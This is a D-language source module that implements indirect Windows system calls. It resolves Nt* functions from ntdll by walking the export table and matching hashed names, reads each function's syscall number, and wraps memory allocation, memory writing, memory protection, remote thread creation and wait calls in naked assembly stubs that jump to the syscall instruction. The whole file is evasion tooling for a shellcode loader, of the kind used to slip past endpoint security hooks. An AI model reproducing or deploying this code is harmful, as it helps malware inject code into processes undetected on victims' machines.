module syscalls;

import core.sys.windows.windows;
import core.stdcpp.vector;
import std.stdio;

extern (C) int strncmp ( const char * str1, const char * str2, size_t num );

T rvaToVa(T) (DWORD_PTR peBase, DWORD offset) {
    return cast(T)(peBase + offset);
}

PVOID getImage(string targetMod) {
    return cast(PVOID)GetModuleHandleA(cast(LPCSTR)targetMod);
}

DWORD djb2(LPCSTR str) {
	DWORD dwHash = 0x25636360;
    DWORD strLen = lstrlenA(str);

	for (SIZE_T i = 0; i < strLen; i ++) {
        dwHash = ((dwHash << 0x5) + dwHash) + str[i];
    }

	return dwHash;
}


PIMAGE_EXPORT_DIRECTORY parseExportDirectory(PVOID peImage) {
    auto peBase = cast(DWORD_PTR)peImage;

    PIMAGE_DOS_HEADER dosHdr = cast(PIMAGE_DOS_HEADER)(peBase);
    
    PIMAGE_NT_HEADERS ntHdrs = rvaToVa!PIMAGE_NT_HEADERS(peBase, dosHdr.e_lfanew);

    IMAGE_OPTIONAL_HEADER optHdr = ntHdrs.OptionalHeader;
    IMAGE_FILE_HEADER fileHdr = ntHdrs.FileHeader;

    auto expDir = rvaToVa!PIMAGE_EXPORT_DIRECTORY(peBase, cast(DWORD)optHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    return expDir;
}

struct VxTableEntry {
    PVOID pAddress;
    PVOID jmpAddr;
    DWORD dwHash;
    WORD wSystemCall;
}

vector!VxTableEntry syscallEntries = vector!VxTableEntry(Default);

void populateSyscallEntries() {


    auto peImage = getImage("NTDLL");
    auto peBase = cast(DWORD_PTR)(peImage);
    auto expDir = parseExportDirectory(peImage);

    PDWORD addrOfNames = rvaToVa!PDWORD(peBase, expDir.AddressOfNames);
    PDWORD addrOfFuncs = rvaToVa!PDWORD(peBase, expDir.AddressOfFunctions);
    PWORD addrOfNameOrds = rvaToVa!PWORD(peBase, expDir.AddressOfNameOrdinals);

    for (SIZE_T i = 0; i < expDir.NumberOfFunctions - 1; i++) {
        VxTableEntry vxTableEntry;
        LPCSTR fnName = rvaToVa!LPCSTR(peBase, addrOfNames[i]);
        WORD fnOrd = addrOfNameOrds[i];
        PVOID fnAddr = rvaToVa!PVOID(peBase, addrOfFuncs[fnOrd]);

        if (!strncmp(fnName, "Nt", 2)) {
            
            vxTableEntry.pAddress = fnAddr;
            vxTableEntry.dwHash = cast(uint)djb2(fnName);

            auto pAddress = cast(PBYTE)fnAddr;

            WORD cw = 0;

            while (TRUE) {

                if (*cast(PBYTE)(pAddress + cw) == 0x0f && *cast(PBYTE)(pAddress + cw + 1) == 0x05) {
                    vxTableEntry.jmpAddr = cast(PVOID) (pAddress + cw);
                    syscallEntries.push_back(vxTableEntry);
                    break;
                }

                if (*cast(PBYTE)(pAddress + cw) == 0xc3) {
                    break;
                }

                if (*cast(PBYTE)(pAddress + cw) == 0x4c && *cast(PBYTE)(pAddress + cw + 1) == 0x8b && *cast(PBYTE)(pAddress + cw + 2) == 0xd1 && *cast(PBYTE)(pAddress + cw + 6) == 0x00 && *cast(PBYTE)(pAddress + cw + 7) == 0x00) {

                    BYTE high = *cast(PBYTE)(pAddress + 5 + cw);
                    BYTE low = *cast(PBYTE)(pAddress + 4 + cw);

                    WORD ssn = (high << 8) | low;
                    vxTableEntry.wSystemCall = ssn;   
                }

                cw++;
            
        }

        }
            
    }

}


DWORD getSyscallNumber(DWORD hash) {
    foreach( VxTableEntry tableEntry; syscallEntries ) {
        
        if (tableEntry.dwHash == hash) {
            
            return tableEntry.wSystemCall;
        }
    }

    return -1;
}

PVOID getSyscallJmpAddr(DWORD hash) {

    foreach( VxTableEntry tableEntry; syscallEntries ) {
        
        if (tableEntry.dwHash == hash) {
            return tableEntry.jmpAddr;
        }
    }

    return NULL;
}

alias NTSTATUS = uint;

extern(Windows) NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    
    asm {
        naked;
        mov [RSP +8], RCX;         
        mov [RSP+16], RDX;
        mov [RSP+24], R8;
        mov [RSP+32], R9;

        sub RSP, 0X28;
        mov ECX, 0x94cc9347; // NTAVM Hash
        call getSyscallJmpAddr;
        add RSP, 0X28;
        mov R11, RAX;

        sub RSP, 0x28;
        mov ECX, 0x94cc9347; // NTAVM Hash
        call getSyscallNumber;              
        add RSP, 0x28;

        mov RCX, [RSP+8];                      
        mov RDX, [RSP+16];
        mov R8, [RSP+24];
        mov R9, [RSP+32];
        mov R10, RCX;
        jmp R11;              
        ret;

    }

}


extern (Windows) NTSTATUS NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
) {

    asm {
        naked;
        mov [RSP +8], RCX;         
        mov [RSP+16], RDX;
        mov [RSP+24], R8;
        mov [RSP+32], R9;

        sub RSP, 0X28;
        mov ECX, 0xdec7016d; // NTWVM Hash
        call getSyscallJmpAddr;
        add RSP, 0X28;
        mov R11, RAX;

        sub RSP, 0x28;
        mov ECX, 0xdec7016d; // NTWVM Hash
        call getSyscallNumber;              
        add RSP, 0x28;

        mov RCX, [RSP+8];                      
        mov RDX, [RSP+16];
        mov R8, [RSP+24];
        mov R9, [RSP+32];
        mov R10, RCX;
        jmp R11;              
        ret;

    }


}


extern(Windows) NTSTATUS NtProtectVirtualMemory(
  HANDLE ProcessHandle,
  PVOID *BaseAddress,
  PULONG NumberOfBytesToProtect,
  ULONG NewAccessProtection,
  PULONG OldAccessProtection 
) {


    asm {
        naked;
        mov [RSP +8], RCX;         
        mov [RSP+16], RDX;
        mov [RSP+24], R8;
        mov [RSP+32], R9;

        sub RSP, 0X28;
        mov ECX, 0xd33a9f63; // NTPVM Hash
        call getSyscallJmpAddr;
        add RSP, 0X28;
        mov R11, RAX;

        sub RSP, 0x28;
        mov ECX, 0xd33a9f63; // NTPVM Hash
        call getSyscallNumber;              
        add RSP, 0x28;

        mov RCX, [RSP+8];                      
        mov RDX, [RSP+16];
        mov R8, [RSP+24];
        mov R9, [RSP+32];
        mov R10, RCX;
        jmp R11;              
        ret;

    }

}

extern (Windows) NTSTATUS NtCreateThreadEx(
  PHANDLE hThread,
  ACCESS_MASK DesiredAccess,
  PVOID ObjectAttributes,
  HANDLE ProcessHandle,
  PVOID lpStartAddress,
  PVOID lpParameter,
  ULONG Flags,
  SIZE_T StackZeroBits,
  SIZE_T SizeOfStackCommit,
  SIZE_T SizeOfStackReserve,
  PVOID lpBytesBuffer
) {

    asm {
        naked;
        mov [RSP +8], RCX;         
        mov [RSP+16], RDX;
        mov [RSP+24], R8;
        mov [RSP+32], R9;

        sub RSP, 0X28;
        mov ECX, 0xecbec58b; // NTCTX Hash
        call getSyscallJmpAddr;
        add RSP, 0X28;
        mov R11, RAX;

        sub RSP, 0x28;
        mov ECX, 0xecbec58b; // NTCTX Hash
        call getSyscallNumber;              
        add RSP, 0x28;

        mov RCX, [RSP+8];                      
        mov RDX, [RSP+16];
        mov R8, [RSP+24];
        mov R9, [RSP+32];
        mov R10, RCX;
        jmp R11;              
        ret;

    }


}


extern (Windows) NTSTATUS NtWaitForSingleObject(
  HANDLE         Handle,
  BOOLEAN        Alertable,
  PLARGE_INTEGER Timeout
) {

    asm {
        naked;
        mov [RSP +8], RCX;         
        mov [RSP+16], RDX;
        mov [RSP+24], R8;
        mov [RSP+32], R9;

        sub RSP, 0X28;
        mov ECX, 0xafac5b77; // NTWSO Hash
        call getSyscallJmpAddr;
        add RSP, 0X28;
        mov R11, RAX;

        sub RSP, 0x28;
        mov ECX, 0xafac5b77; // NTWSO Hash
        call getSyscallNumber;              
        add RSP, 0x28;

        mov RCX, [RSP+8];                      
        mov RDX, [RSP+16];
        mov R8, [RSP+24];
        mov R9, [RSP+32];
        mov R10, RCX;
        jmp R11;              
        ret;

    }


}
